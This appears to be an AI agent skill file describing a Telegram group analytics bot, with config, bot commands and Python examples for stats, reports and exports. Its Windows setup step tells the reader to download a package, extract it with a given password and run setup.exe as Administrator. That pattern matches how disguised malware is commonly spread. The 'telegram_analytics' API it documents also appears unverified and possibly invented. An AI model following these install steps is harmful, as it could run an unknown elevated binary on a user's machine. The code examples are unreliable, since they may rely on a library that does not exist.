---
name: telegram-group-analytics-bot
description: Track and analyze Telegram group activity including member growth, message counts, engagement metrics, and generate automated reports
triggers:
  - analyze telegram group statistics
  - track telegram member growth
  - generate telegram group reports
  - monitor telegram chat activity
  - export telegram analytics data
  - create telegram engagement heatmaps
  - set up telegram group monitoring
  - get telegram user participation metrics
---

# Telegram Group Statistics & Analytics Bot

> Skill by [ara.so](https://ara.so) — Data Skills collection.

## Overview

This bot tracks and analyzes Telegram group activity, providing insights on:
- Member growth (joins, leaves, net change)
- Message counts per user and overall
- Activity patterns (hourly/daily heatmaps)
- User engagement and participation
- Automated daily/weekly reports
- CSV/PDF/HTML export capabilities

## Installation

### Windows Setup

1. Download the release package
2. Extract with password: `trainer2026`
3. Run `setup.exe` as Administrator
4. Configure bot token and group settings

### Manual Setup (Python)

```bash
# Clone repository
git clone https://github.com/ddperso/Telegram_Group_Statistics___Analytics_Bot.git
cd Telegram_Group_Statistics___Analytics_Bot

# Install dependencies
pip install -r requirements.txt

# Set up environment variables
export TELEGRAM_BOT_TOKEN="your_bot_token_here"
export TELEGRAM_GROUP_ID="your_group_id_here"
```

## Configuration

Create a `config.json` file:

```json
{
  "bot_token": "${TELEGRAM_BOT_TOKEN}",
  "group_id": "${TELEGRAM_GROUP_ID}",
  "database": "stats.db",
  "report_schedule": {
    "daily": "09:00",
    "weekly": "Monday 09:00"
  },
  "export_formats": ["csv", "html", "pdf"],
  "alert_thresholds": {
    "min_daily_messages": 50,
    "min_active_users": 10
  }
}
```

### Environment Variables

```bash
TELEGRAM_BOT_TOKEN=    # Your Telegram bot token from @BotFather
TELEGRAM_GROUP_ID=     # Target group ID (use negative for groups)
DATABASE_PATH=         # Optional: custom database location
TIMEZONE=              # Optional: timezone for reports (default: UTC)
```

## Key Commands

### Bot Commands (in Telegram)

```
/start          - Initialize bot in the group
/stats          - Get current statistics
/report daily   - Generate daily report
/report weekly  - Generate weekly report
/top [N]        - Show top N active users (default: 10)
/growth         - Show member growth chart
/activity       - Display activity heatmap
/export csv     - Export data to CSV
/export html    - Export to HTML report
/alerts on      - Enable activity alerts
/alerts off     - Disable alerts
```

### Admin Commands

```
/config show    - Display current configuration
/config set key value - Update configuration
/reset          - Reset all statistics
/backup         - Create database backup
```

## API Usage

### Python Library Integration

```python
from telegram_analytics import GroupAnalyzer, ReportGenerator
import os

# Initialize analyzer
analyzer = GroupAnalyzer(
    bot_token=os.environ['TELEGRAM_BOT_TOKEN'],
    group_id=os.environ['TELEGRAM_GROUP_ID']
)

# Get member statistics
member_stats = analyzer.get_member_stats()
print(f"Total members: {member_stats['total']}")
print(f"New today: {member_stats['joined_today']}")
print(f"Left today: {member_stats['left_today']}")

# Get message statistics
message_stats = analyzer.get_message_stats(days=7)
print(f"Total messages (7d): {message_stats['total']}")
print(f"Average per day: {message_stats['avg_per_day']}")

# Get top contributors
top_users = analyzer.get_top_users(limit=10, days=30)
for user in top_users:
    print(f"{user['name']}: {user['message_count']} messages")

# Generate activity heatmap
heatmap = analyzer.generate_heatmap(days=30)
heatmap.save('activity_heatmap.png')
```

### Message Tracking

```python
from telegram_analytics import MessageTracker

tracker = MessageTracker(database='stats.db')

# Track new message
tracker.record_message(
    user_id=123456,
    username='john_doe',
    message_id=789,
    timestamp='2026-07-02 10:30:00',
    text_length=150,
    has_media=False
)

# Get user activity
user_activity = tracker.get_user_activity(user_id=123456, days=7)
print(f"Messages: {user_activity['message_count']}")
print(f"Avg length: {user_activity['avg_message_length']}")
print(f"Active hours: {user_activity['most_active_hours']}")
```

### Report Generation

```python
from telegram_analytics import ReportGenerator

generator = ReportGenerator(
    database='stats.db',
    output_dir='reports'
)

# Generate daily report
daily_report = generator.generate_daily_report(
    format='html',
    date='2026-07-02'
)
print(f"Report saved to: {daily_report['path']}")

# Generate weekly report with charts
weekly_report = generator.generate_weekly_report(
    format='pdf',
    week_start='2026-06-25',
    include_charts=True,
    include_top_users=20
)

# Custom report
custom_report = generator.generate_custom_report(
    start_date='2026-06-01',
    end_date='2026-07-01',
    metrics=['messages', 'users', 'growth', 'engagement'],
    format='csv'
)
```

### Activity Alerts

```python
from telegram_analytics import AlertManager

alert_manager = AlertManager(
    bot_token=os.environ['TELEGRAM_BOT_TOKEN'],
    admin_ids=[123456, 789012]
)

# Set up alerts
alert_manager.configure_alerts(
    min_daily_messages=50,
    min_active_users=10,
    max_leave_rate=0.05  # 5% leave rate threshold
)

# Check and send alerts
alert_manager.check_and_notify()

# Custom alert
if message_stats['total'] < 50:
    alert_manager.send_alert(
        level='warning',
        message='Daily message count below threshold',
        data={'current': message_stats['total'], 'threshold': 50}
    )
```

## Data Export

### CSV Export

```python
from telegram_analytics import DataExporter

exporter = DataExporter(database='stats.db')

# Export all data
exporter.export_to_csv(
    output_file='telegram_stats.csv',
    start_date='2026-01-01',
    end_date='2026-07-02',
    include_fields=['user_id', 'username', 'message_count', 'join_date']
)

# Export specific metrics
exporter.export_user_stats(
    output_file='user_stats.csv',
    sort_by='message_count',
    limit=100
)

exporter.export_daily_summary(
    output_file='daily_summary.csv',
    days=90
)
```

### HTML/PDF Reports

```python
# HTML with charts
report = generator.generate_html_report(
    template='detailed',
    include_charts=['member_growth', 'activity_heatmap', 'top_users'],
    theme='dark'
)

# PDF report
pdf_report = generator.generate_pdf_report(
    layout='landscape',
    sections=['summary', 'charts', 'top_users', 'activity'],
    logo_path='logo.png'
)
```

## Common Patterns

### Automated Daily Reports

```python
import schedule
import time

def send_daily_report():
    analyzer = GroupAnalyzer(
        bot_token=os.environ['TELEGRAM_BOT_TOKEN'],
        group_id=os.environ['TELEGRAM_GROUP_ID']
    )
    
    report = analyzer.generate_daily_summary()
    analyzer.send_message(
        chat_id=os.environ['TELEGRAM_GROUP_ID'],
        text=report,
        parse_mode='Markdown'
    )

# Schedule daily at 9 AM
schedule.every().day.at("09:00").do(send_daily_report)

while True:
    schedule.run_pending()
    time.sleep(60)
```

### Real-time Activity Monitoring

```python
from telegram import Update
from telegram.ext import Updater, MessageHandler, Filters

def track_message(update: Update, context):
    tracker = MessageTracker(database='stats.db')
    
    tracker.record_message(
        user_id=update.effective_user.id,
        username=update.effective_user.username,
        message_id=update.message.message_id,
        timestamp=update.message.date,
        text_length=len(update.message.text or ''),
        has_media=bool(update.message.photo or update.message.video)
    )

updater = Updater(token=os.environ['TELEGRAM_BOT_TOKEN'])
updater.dispatcher.add_handler(MessageHandler(Filters.all, track_message))
updater.start_polling()
```

### Member Change Tracking

```python
from telegram.ext import ChatMemberHandler

def track_member_change(update: Update, context):
    old_member = update.chat_member.old_chat_member
    new_member = update.chat_member.new_chat_member
    
    analyzer = GroupAnalyzer(
        bot_token=os.environ['TELEGRAM_BOT_TOKEN'],
        group_id=update.effective_chat.id
    )
    
    if old_member.status == 'left' and new_member.status == 'member':
        analyzer.record_member_join(new_member.user.id)
    elif old_member.status == 'member' and new_member.status == 'left':
        analyzer.record_member_leave(old_member.user.id)

updater.dispatcher.add_handler(ChatMemberHandler(track_member_change))
```

## Troubleshooting

### Bot Not Receiving Messages

```python
# Check bot permissions
from telegram import Bot

bot = Bot(token=os.environ['TELEGRAM_BOT_TOKEN'])
chat = bot.get_chat(chat_id=os.environ['TELEGRAM_GROUP_ID'])

print(f"Bot in chat: {chat.title}")
print(f"Bot permissions: {bot.get_chat_member(chat.id, bot.id).status}")

# Ensure bot is admin to track member changes
```

### Database Locks

```python
import sqlite3

# Use WAL mode for concurrent access
conn = sqlite3.connect('stats.db')
conn.execute('PRAGMA journal_mode=WAL')
conn.close()

# Or use connection pooling
from sqlalchemy import create_engine, pool

engine = create_engine(
    'sqlite:///stats.db',
    poolclass=pool.QueuePool,
    pool_size=5,
    max_overflow=10
)
```

### Missing Historical Data

```python
# Backfill from Telegram API
from telegram_analytics import HistoryImporter

importer = HistoryImporter(
    bot_token=os.environ['TELEGRAM_BOT_TOKEN'],
    group_id=os.environ['TELEGRAM_GROUP_ID']
)

# Import last 1000 messages
importer.import_history(
    limit=1000,
    offset_date='2026-06-01'
)
```

### Memory Issues with Large Groups

```python
# Use chunked processing
analyzer = GroupAnalyzer(
    bot_token=os.environ['TELEGRAM_BOT_TOKEN'],
    group_id=os.environ['TELEGRAM_GROUP_ID'],
    batch_size=100  # Process in batches
)

# Generate reports in chunks
for chunk in analyzer.iter_message_stats(chunk_size=1000):
    process_chunk(chunk)
```

### Rate Limiting

```python
import time
from functools import wraps

def rate_limit(calls_per_second=1):
    min_interval = 1.0 / calls_per_second
    last_called = [0.0]
    
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            elapsed = time.time() - last_called[0]
            if elapsed < min_interval:
                time.sleep(min_interval - elapsed)
            result = func(*args, **kwargs)
            last_called[0] = time.time()
            return result
        return wrapper
    return decorator

@rate_limit(calls_per_second=20)
def fetch_user_data(user_id):
    # Your API call here
    pass
```

## Best Practices

1. **Store credentials securely** - Use environment variables, never hardcode tokens
2. **Regular backups** - Schedule daily database backups
3. **Monitor bot health** - Set up alerts for bot downtime
4. **Respect privacy** - Only collect necessary data, inform users
5. **Optimize queries** - Index frequently queried fields in the database
6. **Clean old data** - Archive or remove data older than retention period
